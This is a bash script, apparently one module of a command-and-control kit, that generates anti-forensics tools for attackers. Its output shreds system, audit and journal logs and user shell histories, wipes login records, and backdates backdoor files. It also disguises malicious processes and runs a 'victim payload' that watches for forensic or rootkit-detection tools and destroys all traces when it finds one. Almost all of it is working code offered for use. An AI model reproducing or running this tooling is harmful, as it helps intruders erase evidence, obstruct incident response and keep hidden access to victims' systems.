#!/bin/bash
# ============================================
# APT ANTI-FORENSICS ENGINE v1.0
# Log Cleaner | Timestamp Wipe | Trace Killer
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

AF_DIR="$HOME/c2_server/modules/stealth/anti_forensics"
PAYLOAD_DIR="$HOME/c2_server/payloads"
LOG_DIR="$HOME/c2_server/logs"

mkdir -p "$AF_DIR" "$PAYLOAD_DIR" "$LOG_DIR"

# === LOG CLEANER ===
generate_log_cleaner() {
    echo -e "\n${CYAN}[Log Cleaner Generator]${NC}"
    
    cat > "$AF_DIR/log_cleaner.sh" << 'LOGCLEAN'
#!/bin/bash
# APT LOG CLEANER
# Cleans: auth.log, syslog, wtmp, lastlog, bash_history, etc.

echo "[*] Cleaning system logs..."

# System logs
LOG_FILES=(
    /var/log/auth.log
    /var/log/syslog
    /var/log/messages
    /var/log/secure
    /var/log/apache2/access.log
    /var/log/apache2/error.log
    /var/log/nginx/access.log
    /var/log/nginx/error.log
    /var/log/mysql/error.log
    /var/log/kern.log
    /var/log/daemon.log
    /var/log/user.log
    /var/log/cron.log
)

for log in "${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        # Option 1: Delete
        # rm -f "$log"
        
        # Option 2: Shred (overwrite + delete)
        shred -zu "$log" 2>/dev/null
        
        # Option 3: Selective clean (remove our IP only)
        # sed -i '/C2_IP_ADDRESS/d' "$log"
        
        echo "  [✓] Cleaned: $log"
    fi
done

# User history
HISTORY_FILES=(
    $HOME/.bash_history
    $HOME/.zsh_history
    $HOME/.fish_history
    $HOME/.python_history
    $HOME/.mysql_history
    $HOME/.psql_history
    /root/.bash_history
    /root/.zsh_history
)

for hist in "${HISTORY_FILES[@]}"; do
    if [ -f "$hist" ]; then
        shred -zu "$hist" 2>/dev/null
        ln -sf /dev/null "$hist" 2>/dev/null  # Prevent future logging
        echo "  [✓] Cleaned: $hist"
    fi
done

# Wipe login records
wtmp_files=(/var/log/wtmp /var/log/lastlog /var/log/btmp /var/run/utmp)
for f in "${wtmp_files[@]}"; do
    [ -f "$f" ] && { cat /dev/null > "$f"; echo "  [✓] Wiped: $f"; }
done

echo "[+] Log cleaning complete"
LOGCLEAN
    chmod +x "$AF_DIR/log_cleaner.sh"
    echo -e "${GREEN}[+]${NC} Log cleaner: $AF_DIR/log_cleaner.sh"
}

# === TIMESTAMP WIPE ===
generate_timestamp_wipe() {
    echo -e "\n${CYAN}[Timestamp Wiper Generator]${NC}"
    
    cat > "$AF_DIR/timestamp_wipe.sh" << 'TIMEWIPE'
#!/bin/bash
# APT TIMESTAMP WIPER
# Restores original timestamps to avoid forensic detection

echo "[*] Wiping file timestamps..."

BACKDOOR_DIR="$HOME/.cache/.system_update"

if [ -d "$BACKDOOR_DIR" ]; then
    # Set all files to same date as system install
    REFERENCE_FILE="/etc/hostname"  # File that existed before compromise
    
    if [ -f "$REFERENCE_FILE" ]; then
        REF_TIME=$(stat -c %Y "$REFERENCE_FILE" 2>/dev/null)
        
        # Apply to all backdoor files
        find "$BACKDOOR_DIR" -type f -exec touch -d @$REF_TIME {} \; 2>/dev/null
        find "$BACKDOOR_DIR" -type d -exec touch -d @$REF_TIME {} \; 2>/dev/null
        
        echo "  [✓] Timestamps restored to: $(date -d @$REF_TIME)"
    fi
fi

# Wipe filesystem journal timestamps
# (prevents recovery of original modification times)
for fs in /dev/sda* /dev/mmcblk* /dev/dm-*; do
    [ -b "$fs" ] && {
        tune2fs -O ^has_journal "$fs" 2>/dev/null  # Disable journal (risky)
        tune2fs -O has_journal "$fs" 2>/dev/null    # Re-enable (clears old)
    }
done 2>/dev/null

echo "[+] Timestamp wipe complete"
TIMEWIPE
    chmod +x "$AF_DIR/timestamp_wipe.sh"
    echo -e "${GREEN}[+]${NC} Timestamp wiper: $AF_DIR/timestamp_wipe.sh"
}

# === FILE SHREDDER ===
generate_file_shredder() {
    echo -e "\n${CYAN}[File Shredder Generator]${NC}"
    
    cat > "$AF_DIR/file_shredder.sh" << 'SHRED'
#!/bin/bash
# APT FILE SHREDDER
# Secure deletion: 7-pass DoD 5220.22-M standard

echo "[*] Shredding sensitive files..."

SENSITIVE_FILES=(
    "$HOME/.cache/.system_update"
    "$HOME/.malware_builder"
    "/tmp/.screen.png"
    "/tmp/.c2_response"
    "/tmp/.klog.tar.gz"
    "/var/tmp/.hidden"
)

for file in "${SENSITIVE_FILES[@]}"; do
    if [ -e "$file" ]; then
        # DoD 7-pass wipe
        shred -z -n 7 -u "$file" 2>/dev/null
        echo "  [✓] Shredded: $file"
    fi
done

# Also shred free space (prevents carving)
echo "[*] Wiping free space (this may take a while)..."
# cat /dev/urandom > /tmp/.wipe 2>/dev/null && rm -f /tmp/.wipe
# Use sfdisk for SSDs
# fstrim / 2>/dev/null

echo "[+] File shredding complete"
SHRED
    chmod +x "$AF_DIR/file_shredder.sh"
    echo -e "${GREEN}[+]${NC} File shredder: $AF_DIR/file_shredder.sh"
}

# === PROCESS TRACE REMOVER ===
generate_process_cleaner() {
    echo -e "\n${CYAN}[Process Trace Remover Generator]${NC}"
    
    cat > "$AF_DIR/process_cleaner.sh" << 'PROCCLEAN'
#!/bin/bash
# APT PROCESS TRACE REMOVER
# Hides process activity from forensic tools

echo "[*] Removing process traces..."

# Clear /proc entries for our processes
OUR_PROCS=("backdoor" "shell" "keylogger" "exfil" "pivot" "c2_client" "netd")

for proc in "${OUR_PROCS[@]}"; do
    # Find and kill
    pkill -f "$proc" 2>/dev/null
    
    # Clear from /proc (if still running under different name)
    for pid in $(pgrep -f "$proc" 2>/dev/null); do
        # Overwrite /proc/pid/cmdline
        echo "systemd" > "/proc/$pid/cmdline" 2>/dev/null
        echo "systemd" > "/proc/$pid/comm" 2>/dev/null
    done
done

# Clear audit logs
if [ -d /var/log/audit ]; then
    rm -f /var/log/audit/audit.log* 2>/dev/null
    echo "  [✓] Audit logs cleared"
fi

# Clear systemd journal
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null
echo "  [✓] Journal cleared"

# Clear tmp directories
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null

echo "[+] Process trace removal complete"
PROCCLEAN
    chmod +x "$AF_DIR/process_cleaner.sh"
    echo -e "${GREEN}[+]${NC} Process cleaner: $AF_DIR/process_cleaner.sh"
}

# === MEMORY WIPE ===
generate_memory_wipe() {
    echo -e "\n${CYAN}[Memory Wiper Generator]${NC}"
    
    cat > "$AF_DIR/memory_wipe.sh" << 'MEMWIPE'
#!/bin/bash
# APT MEMORY WIPER
# Clears RAM traces to prevent cold boot / memory forensics

echo "[*] Wiping memory traces..."

# Clear page cache, dentries, inodes
echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
echo "  [✓] Page cache cleared"

# Clear swap
if [ -n "$(swapon --show 2>/dev/null)" ]; then
    swapoff -a 2>/dev/null
    swapon -a 2>/dev/null
    echo "  [✓] Swap cleared"
fi

# Overwrite free memory (prevents cold boot attack)
python3 -c "
import ctypes, sys
# Allocate and fill memory
size = 100 * 1024 * 1024  # 100 MB
data = bytearray(size)
for i in range(size):
    data[i] = 0xFF
# Free (memory now contains 0xFF instead of our data)
del data
" 2>/dev/null
echo "  [✓] Free memory overwritten"

echo "[+] Memory wipe complete"
MEMWIPE
    chmod +x "$AF_DIR/memory_wipe.sh"
    echo -e "${GREEN}[+]${NC} Memory wiper: $AF_DIR/memory_wipe.sh"
}

# === FORENSIC TOOL DETECTOR ===
generate_forensic_detector() {
    echo -e "\n${CYAN}[Forensic Tool Detector]${NC}"
    
    cat > "$AF_DIR/forensic_detector.sh" << 'FORENDETECT'
#!/bin/bash
# APT FORENSIC TOOL DETECTOR
# Detects if forensic tools are running, auto-clean if yes

FORENSIC_TOOLS=(
    "autopsy"
    "sleuthkit"
    "volatility"
    "dd"
    "dcfldd"
    "guymager"
    "foremost"
    "scalpel"
    "bulk_extractor"
    "binwalk"
    "chkrootkit"
    "rkhunter"
    "lynis"
    "aide"
    "tripwire"
)

echo "[*] Scanning for forensic tools..."

DETECTED=0
for tool in "${FORENSIC_TOOLS[@]}"; do
    if pgrep -f "$tool" >/dev/null 2>&1; then
        echo "  [!] DETECTED: $tool"
        DETECTED=$((DETECTED + 1))
    fi
done

if [ "$DETECTED" -gt 0 ]; then
    echo "[!] $DETECTED forensic tools detected!"
    echo "[*] Initiating emergency cleanup..."
    
    # Trigger all cleaners
    bash "$HOME/c2_server/modules/stealth/anti_forensics/log_cleaner.sh" 2>/dev/null
    bash "$HOME/c2_server/modules/stealth/anti_forensics/file_shredder.sh" 2>/dev/null
    bash "$HOME/c2_server/modules/stealth/anti_forensics/memory_wipe.sh" 2>/dev/null
    
    # Self-destruct
    bash "$HOME/c2_server/modules/kill_switch.sh" self_destruct 2>/dev/null
    
    echo "[!] EMERGENCY: Forensic investigation detected — All traces destroyed!"
else
    echo "[+] No forensic tools detected — Safe"
fi
FORENDETECT
    chmod +x "$AF_DIR/forensic_detector.sh"
    echo -e "${GREEN}[+]${NC} Forensic detector: $AF_DIR/forensic_detector.sh"
}

# === GENERATE VICTIM PAYLOAD ===
generate_anti_forensics_payload() {
    echo -e "\n${CYAN}[Generating Victim Anti-Forensics Payload]${NC}"
    
    cat > "$PAYLOAD_DIR/anti_forensics_payload.sh" << 'AFPAYLOAD'
#!/bin/bash
# APT ANTI-FORENSICS PAYLOAD
# Auto-deploy on victim device

echo "[*] Anti-Forensics Payload Activated"

# 1. Clean logs immediately
bash log_cleaner.sh 2>/dev/null

# 2. Wipe timestamps
bash timestamp_wipe.sh 2>/dev/null

# 3. Hide processes
bash process_cleaner.sh 2>/dev/null

# 4. Start forensic detector (runs every 5 min)
while true; do
    bash forensic_detector.sh 2>/dev/null
    
    # Check if we should self-destruct
    if [ -f "/tmp/.self_destruct" ]; then
        bash file_shredder.sh 2>/dev/null
        bash memory_wipe.sh 2>/dev/null
        rm -f /tmp/.self_destruct
        echo "[!] SELF-DESTRUCT COMPLETE"
        exit 0
    fi
    
    sleep 300
done &

echo "[+] Anti-forensics measures active"
echo "[!] Clean: Logs, Timestamps, Processes"
echo "[!] Monitoring: Forensic tools"
AFPAYLOAD
    chmod +x "$PAYLOAD_DIR/anti_forensics_payload.sh"
    echo -e "${GREEN}[+]${NC} Victim payload: $PAYLOAD_DIR/anti_forensics_payload.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  🛡️ ANTI-FORENSICS v1.0    ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 📋 Generate Log Cleaner"
        echo -e "  ${GREEN}2)${NC} 🕐 Generate Timestamp Wiper"
        echo -e "  ${GREEN}3)${NC} 🔒 Generate File Shredder"
        echo -e "  ${GREEN}4)${NC} 👻 Generate Process Cleaner"
        echo -e "  ${GREEN}5)${NC} 🧠 Generate Memory Wiper"
        echo -e "  ${GREEN}6)${NC} 🔍 Generate Forensic Detector"
        echo -e "  ${GREEN}7)${NC} 📲 Generate Victim Payload"
        echo -e "  ${GREEN}8)${NC} 🚀 Generate ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) generate_log_cleaner ;;
            2) generate_timestamp_wipe ;;
            3) generate_file_shredder ;;
            4) generate_process_cleaner ;;
            5) generate_memory_wipe ;;
            6) generate_forensic_detector ;;
            7) generate_anti_forensics_payload ;;
            8)
                generate_log_cleaner
                generate_timestamp_wipe
                generate_file_shredder
                generate_process_cleaner
                generate_memory_wipe
                generate_forensic_detector
                generate_anti_forensics_payload
                echo -e "\n${GREEN}[+]${NC} All anti-forensics tools generated!"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
